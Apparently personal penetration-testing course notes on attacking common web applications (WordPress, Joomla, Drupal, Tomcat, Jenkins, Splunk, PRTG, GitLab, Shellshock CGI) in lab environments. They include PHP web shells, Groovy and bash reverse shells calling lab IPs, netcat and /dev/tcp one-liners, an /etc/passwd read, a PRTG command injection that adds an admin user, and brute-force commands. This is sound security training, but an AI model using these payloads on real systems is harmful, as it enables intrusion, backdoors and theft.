#CWES #methodology #wordpress #joomla #drupal #jenkins #splunk #osticket #PRTG #gitlab #coldfusion 

#### Lessons:
- If we get a domain: `*.domain.com` we should always try to vhost fuzz it or subdomain fuzz it. (vhost fuzzing gobuster is good, remeber to add the top domain to our etc host before)

#### Common applications:
![[Pasted image 20260717085257.png]]


#### Discovery and enumeration
**Figure out what is running:**
- Port scan with nmap, the scan should be tweaked to fit the scope. 
- Scan take screenshot of all of them using eyewitness (https://github.com/RedSiege/EyeWitness) - use the xml output of nmap as input and run it like this:
```shell
eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```

- For screenshots we can also use aquatone:
```shell
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
```

```shell
cat web_discovery.xml | aquatone -nmap  
```

#### Wordpress
- Identify by reading source code or checking curl response. Can also check /robots.txt file. We should ofc note the version of wordpress

```
curl -s http://blog.inlanefreight.local | grep WordPress
```

```
curl -s http://blog.inlanefreight.local/ | grep themes
```

```
curl -s http://blog.inlanefreight.local/ | grep plugins
```


**Roles:**
1. Administrator: This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.
2. Editor: An editor can publish and manage posts, including the posts of other users.
3. Author: They can publish and manage their own posts.
4. Contributor: These users can write and manage their own posts but cannot publish them.
5. Subscriber: These are standard users who can browse posts and edit their profiles.

**Enumeration:**
- After confirming we are dealing with wordpress, we can start checking out what plugins the app has - some of these can have vulnerabilities we can exploit. Note: if we find the plugin directory of the app, try to read readme.txt file to get more info about the version running.
- We should also enumerate existing users on the app, example by checking if the login page gives different response for different usernames
- WPscan - runs a wordpress vulnerability scan (need api key to get vulnerability data)
```
sudo apt install wpscan
```

**login bruteforce:**
```shell
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

**Web shell**
A common way to get code exec on wordpress is via the them edition: `appearence -> them editor`. Here we can edit the php code in one of the pages and upload a webshell:
```php
system($_GET[cmd]);
```
- Note we can also upload a reverse shell here. Be creative, check what you have available. remember php can use exec() to execute commands. 



Then we can access this theme via the path:
```
http://<wp-site>/wp-content/themes/<them name>/<filename>.php?cmd=whoami
```


#### Joomla
- CMS similar to wordpress

**Enumeration:**
- Find version: check  `/README.txt` , `robots.txt` directory
```shell
curl -s http://<joomla-site>/ | grep Joomla
```

**Scanners:** (Note from source or via pip, different syntax)
 https://github.com/SamJoan/droopescan :
```shell
droopescan scan joomla --url http://dev.inlanefreight.local/
```

https://github.com/drego85/JoomlaScan:
```
python2 joomlascan.py -u http://dev.inlanefreight.local
```

https://github.com/ajnik/joomla-bruteforce (Login bruteforce)
```
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

**Attacking joomla**
- If we have access to a user with admin rights to the joomla admin page, we can edit source code - and include web or reverse shells.
- Edit source code `templates -> find a php file we can access`

Ex:
```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```


```shell
http://<joomla-site>/templates/<template-name>/<file-name>.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```


#### Drupal
- CMS, written in PHP, uses Mysql, postgresql or sqlite as backend.


**Enumeration:**
- Identify it as drupal via footer, readme.txt, changelog.txt, robots.txt etc.

**Attacking drupal:**
- If the version is <8 it is possible to enable the php filter module: "Allows embedded PHP code/snippets to be evaluated." -> go to Content -> Add content -> create Basic page ->  php shell  

Drupalgeddon:
- https://www.exploit-db.com/exploits/34992
- version 2: https://www.exploit-db.com/exploits/44448 -> potential unauthenticated RCE == OP. Ex:

```
python3 drupalgeddon2.py 
```
- If we get a hello.txt uploaded, it is vulnerable. 

Then we can modify the script to upload some php shell code. 
```shell
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
```

And add to the payload:
```shell
 echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```

Note: here we base64 encode and decode to not get fucked by some wierd string handling, there is probably other ways to do this. 


#### Tomcat 
- Web server that hosts applications written in JAVA.

**Enumeration:**
- Identify via: HTTP header Server, example if the server is behind a reverse proxy requesting a invalid page might reveal the server and version.
- Can also identify via /docs folder - default doc page which may or may not have been removed. 
- Look for `/manager` or `/host-manager` pages. Default creds are admin:admin or tomcat:tomcat. Access to these will probably end in RCE.
NOTE: we can also try to brute force the login to these sites with the following script: https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce (or another fuzzing tool)

```shell
python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

Alternative way to bruteforce, the metasploitmodule: [auxiliary/scanner/http/tomcat_mgr_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/) 


**Attacking tomcat:**
When we have access to the manager or host-manager pages, we can try to upload some type of script to get RCE. 

ex: https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp 
```
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp

zip -r backup.war cmd.jsp
```
- This gives us a .war file we can deploy via the manager page

Can also use msfvenom to create the payload:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```

CVE and exploit:
- https://web.archive.org/web/20260130182638/https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/blob/master/CNVD-2020-10487-Tomcat-Ajp-lfi.py
- https://www.cve.org/CVERecord?id=CVE-2020-1938 

Allows us to read sensitive files like WEB-INF/web.xml


**Attacking tomcat cgi:** (common gateway interface)
- CGI servlet component in apache tomcat that enables web servers to communicate with external applications beyond the tomcat jvm.
- Middleware between web servers and external information resources like databases 

CVE-2019-0232:
- We can get rce via CGI scripts 
- Mainly a windows related vulnerability
- First check that tomcat is running with a vulnerable version, then fuzz the /cgi directory: (**Change up the extensions, .cmd, .bat, .ps1!! if .cmd did not work, try .bat etc.)**
```shell
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
```

It might not be straight forward to command inject via the scripts: (Try fullpath, or url-encoding the command)
```
curl "http://10.129.204.227:8080/cgi/welcome.bat?&whoami"
```
```
curl "http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe"
```
```
curl "http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe"
```



#### Jenkins
- CI / CD tool 
- Written in JAVA, and is a server based system


**Enumeration:**
- If we get to log in as a user, it is really easy to find the version.
- Google the version and check for CVEs and exploits

**Attacking jenkins:**
- If we get access to a user, we can try to access the /script directory, here we can write groovy scripts and potentially get a shell or run other commands.

ex: id command 
```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

ex: rev shell
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

And if it is running on a windows host:
```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```


#### Splunk:
- SIEM
- Very common tool in enterprises 
- Usually only internal facing, but can sometimes be exposed to the internet. 

**Enumeration:**
- Find the version and get access to a user, admin:changeme is the default creds on older splunk instances.
- Once we have access to a user, we can browse data, run reports, create dashboards, install applications, find ways to run code (Django, REST endpoints, script input, alert scripting)


**Attacking splunk:**
Make a malicious splunk app and upload it.
- Tool: https://github.com/0xjpuff/reverse_shell_splunk 
- Use .py if it runs on linux, use .ps1 if it runs on windows 
- Follow the readme and create a .tar.gz file, this file we can upload in the **manage application** section of splunk, then upload it via **install app from file.**


#### PRTG Network monitor:
- Agentless network monitor
- Monitors bandwidth usage, uptime and statistics from various hosts, routers, switches, servers etc.
- Usually exposed internal only 

#### Enumeration:
- Known vulnerabilities: https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html
- Default creds: `prtgadmin:prtgadmin` 

**Attacking PRTG:**
- If version < 18.2.39: https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/

1. **setup -> account settings -> notifications -> add new notification**
2. Give the notification a name and scroll down and tick the box next to `EXECUTE PROGRAM`. Under `Program File`, select `Demo exe notification - outfile.ps1` from the drop-down. Finally, in the parameter field, enter a command. For our purposes, we will add a new local admin user by entering `test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add`.

Then we can login into this user via CrackMapExec, RDP, or a impacket tool. 


#### osTicket:
- Open source support ticketing system, similar to jira.
- Written in php and mysql
- Can run on windows or linux 
- Not many known vulns, but we might be able to sosial engineere or read sensitive data from tickets.
- Try to get the usernames of some users, and spray their passwords with a common wordlist.

#### Gitlab:
- git repo hosting tool with web interface 
- Uses ruby, go, trails, and vue.js
- There are some know exploits for gitlab, most of them require authentication


**Enumeration:**
- Checkout /explore , look for hardcoded credentials or information about other running applications in scope. 
- Note that some repos we can probability see without logging in, and some require authentication.
- Sometimes we are allowed to create a users without restrictions, in that case we should do that. We might get access to some additional features.
- username enumeration: https://www.exploit-db.com/exploits/49821 (This script was a bit wierd, there exists a python version)
ex:
```shell
./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
```

**Attacking gitlab:**
- https://www.exploit-db.com/exploits/49951 (Authenticated RCE for gitlab 13.10.2) (Very wierd script, could not get it to work 220726)
ex:
```shell
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
```

#### Attacking CGI applications - shellshock(CVE-2014-6271)
- Scripts usually kept in the /cgi-bin directory, and can be written in many languages: c, c++, perl, java, etc.
- Runs in the context of the web server 

CVE-2014-6271:
- Exploit in old versions of bash
- TLDR: we can execute commands after a environment variable has been defined:
ex:
```shell
$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```

1. Find a cgi file with ffuf or gobuster:
```shell
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```
2. If we find anything, try to curl them, see how they work
3. Check if they are vulnerable:
ex:
```shell
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```

If it is vulnerable, try to establish a reverse shell:
```shell
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```

#### Attacking thick client applications 
- Apps that run locally on our computers, not accessed via a web browser. 
- Typically writtin in java or .NET
- Examples: Web browsers, media players, video games, chatting software
- Harder to hack: Reverse engineering and pwn.
- Some thick apps runs without internet access, and some require interaction with the internet or remote servers. (You can investegate this with wireshark or similar)
- Since many of these applications are compiled apps, we sometimes want to reverse engineer them wit ghidra etc. - it can be practical to download the app we want to reverse to our own machine.
- Sometimes just dissembling some apps, can get up hard coded login credentials. 

**Usefull tools:**
- Dnspy: lets us read the source code of .NET programs. Can do this with .dll files and memory which we write to a file.
- X64dbg: Debugger with ui 
- Sysmon and procmon: Can view what happens on the machine when we run the program. Can check if files are created or what scripts are ran.
- Ghidra: Reverse engineering tool for binaries.



#### ColdFusion
- Programming language and web app dev platform based on Java
- Developed by adobe(?)
- There is also a cold fusion markup language 
Some known vulnerabilities:
1. CVE-2021-21087: Arbitrary disallow of uploading JSP source code
2. CVE-2020-24453: Active Directory integration misconfiguration
3. CVE-2020-24450: Command injection vulnerability
4. CVE-2020-24449: Arbitrary file reading vulnerability
5. CVE-2019-15909: Cross-Site Scripting (XSS) Vulnerability

Default ports:
![[Pasted image 20260723103717.png]]

**Enumeration:**
- Port scanning
- Files with extensions .cfm and .cfc
- Http headers like "Server: ColdFusion" or "X-Powered-By: ColdFusion"
- Checkout some common directories: /CFIDE and /cfdocs

**Attacking ColdFusion:**
Checkout the CF version, and check for expoits here:
```
searchsploit adobe coldfusion
```
- For CF8 there exists a unauthenticated RCE

#### ISS Tilde Enumeration
- Enumeration technique to uncover hidden files, directories and short file names on Microsoft internet information service (ISS)
- Require ISS version <= 8.3 (?)
- Enum tool for this vulnerability https://github.com/irsdl/IIS-ShortName-Scanner (Require oracle JAVA)


Alternatively we can use a fitting wordlist and gobuster to perform the enumeration:
Create a relevant wordlist for the enumeration:
```shell
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```

Use the wordlist in gobuster:
```shell
gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
```
- .asp = Active server pages = server-side web pages created by microsoft 

#### LDAP
- Lightweight directory access protocol
- Used to manage and access directory information 
- Can be used for central authentication 

![[Pasted image 20260725134051.png]]

**LDAP injection:**
- Exploits web app that use LDAP for authentication or storing user information. 
- Similar to SQL injection, but attacking directory services instead of databases.
- If we find an endpoint with a webapp and a ldap service running, we might want to try ldap injection against the webapp - since there is a good possibility that the app uses ldap for authentication.

![[Pasted image 20260725134905.png]]

Ex:
Authentication query:
```
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
```

Injection, taking over a the user dummy:
```
$username = "dummy";
$password = "*";
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
```

#### Web Mass assignment 
- Web mass assignment vulnerability is a type of security vulnerability where attackers can modify the model attributes of an application through the parameters sent to the server.
- Errors in web mass assignments code can have big impact 

#### Preventing and hardening common apps:
- We should know what applications are running, and have a inventory of them.
- Change the default admin user and password 
- Access controls per application
- Disable unsafe features, ex. php scripting in php
- Regular patches, and backups
- Integrate login via Active Directory
- Only expose what is necessary to the internet 


#### Assignment 1:
- Scan the ports, and we find a Jenkins and a tomcat instance 
- We find the tomcat version, and see that it is a common vulnerable one with many vulnerabilities 
- We dont get any of the exploits to work, probably because we are not logged in to tomcat 
- We enumerate a bit more, and look for cgi files, and find a cmd.bat
Alternative way to enumerate this:
```
gobuster dir -u http://STMIP:8080/cgi/ -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt -x .bat -t 50 -k -q
```
- We can execute some commands via the url or curl, but some does not work.
- We find a msfconsole module for this vulnerability and set it up:

```
set RHOSTS STMIP
set TARGETURI /cgi/cmd.bat
set LHOST tun0
set FORCEEXPLOIT true
```

This gives us a shell. 